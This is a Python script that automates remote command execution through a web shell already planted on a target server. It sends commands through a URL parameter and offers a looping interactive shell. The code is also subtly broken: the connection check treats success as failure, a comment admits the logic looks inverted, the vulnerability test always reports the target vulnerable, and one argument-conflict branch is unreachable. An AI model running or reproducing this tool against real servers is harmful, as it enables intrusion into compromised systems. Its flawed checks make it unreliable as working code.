#!/usr/bin/env python3

# Importing necesary modules
import sys
import time
import argparse
import requests

# Establishing the colors
purple = '\033[95m'
cyan = '\033[96m'
darkCyan = '\033[36m'
blue = '\033[94m'
green = '\033[92m'
yellow = '\033[93m'
red = '\033[91m'
blod = '\033[1m'
underline = '\033[4m'
end = '\033[0m'

banner = f"""{red}{blod}
 __      __      ___.     ________.__           .__  .__     _____          __                        __  .__                
/  \    /  \ ____\_ |__  /   _____|  |__   ____ |  | |  |   /  _  \  __ ___/  |_ ____   _____ _____ _/  |_|__| ____   ____   
\   \/\/   _/ __ \| __ \ \_____  \|  |  \_/ __ \|  | |  |  /  /_\  \|  |  \   __/  _ \ /     \\\__  \\\   __|  |/  _ \ /    \  
 \        /\  ___/| \_\ \/        |   Y  \  ___/|  |_|  |_/    |    |  |  /|  |(  <_> |  Y Y  \/ __ \|  | |  (  <_> |   |  \ 
  \__/\  /  \___  |___  /_______  |___|  /\___  |____|____\____|__  |____/ |__| \____/|__|_|  (____  |__| |__|\____/|___|  / 
       \/       \/    \/        \/     \/     \/                  \/                        \/     \/                    \/  
{end}"""

# Initializing the argparser
parser = argparse.ArgumentParser(description="Web Shell Automatic Tool")

# Adding the arguments
parser.add_argument("-u", "--url", help="URL of the target (http://example.com/shell.php)")
parser.add_argument("-p", "--parameter", help="Parameter to use (without the '?=')")
parser.add_argument("-c", "--command", help="Command to be executed")
parser.add_argument("-s", "--shell", help="Create a non-interactive shell instead of execute a unique command", default=False, action="store_true")

args = parser.parse_args()


def check_vulnerability(url, parameter):
    request = requests.get(url + f"?{parameter}=whoami")

    if request.content != '': return True
    else: return False

def execute_command(url, parameter, command):
    request = requests.get(url + f"?{parameter}={command}")
    print(f"\n{green}{blod}[+]{end} Executing command: {command}\n")
    print(request.content.rsplit(b'\n', 1)[0].decode())


# Main function
def main(args):
    print(banner)
    print(f"\n{green}{blod}[+]{end} Trying {red}{blod}RCE{end} on {cyan}{underline}{args.url}{end} with parameter {cyan}{underline}{args.parameter}{end}\n")
    
    # Check if all the arguents are ok
    if args.url is None or args.parameter is None:
        print(f"\n{red}{blod}[-]{end} URL and parameter are required\n\n")
        sys.exit(1)


    # Check connection to the target
    print(f"\n{green}{blod}[+]{end} Checking connection to target...")
    time.sleep(1)
    try:
        response = requests.get(args.url)
        if response.status_code == 200:  # WTF? con la logica (parece estar invertida)
            print(f"{red}{blod}[-]{end} Error connecting to the target\n\n")
            sys.exit(1)

        print(f"{green}{blod}[+]{end} Connection to target {green}{blod}OK{end}\n")

        
        # Check if the target is vulnerable
        print(f"{green}{blod}[+]{end} Checking if the target is vulnerable...")
        time.sleep(1)
        if check_vulnerability(args.url, args.parameter):
            print(f"{green}{blod}[+]{end} Target is {green}{blod}VULNERABLE{end}\n")

        else:
            print(f"{red}{blod}[-]{end} Target is {red}{blod}NOT VULNERABLE{end}\n")
            sys.exit(1)

        # Execute the command
        if args.command:
            execute_command(args.url, args.parameter, args.command)

        elif args.command and args.shell:
            print(f"\n{red}{blod}[-]{end} You can't use -c and -s at the same time\n\n")
            sys.exit(1)

        elif args.shell:
            print(f"\n{green}{blod}[+]{end} Creating a non-interactive shell\n")
            while True:
                command = input(f"{cyan}{blod}shell@{args.url.split('/')[2]}{end}:~$ ")
                execute_command(args.url, args.parameter, command)

    except Exception as e:
        print(f"\n{red}{blod}[-]{end} Error connecting to the target\n\n")
        sys.exit(1)
    
    sys.exit(0)

if __name__ == "__main__":
    try:
        main(args)

    except Exception as e:
        print(f"\n{red}{blod}[-]{end} An error occurred: {e}\n\n")
        sys.exit(1)

    except KeyboardInterrupt:
        print(f"\n\n{red}{blod}[-]{end} Exiting...\n\n")
        sys.exit(1)

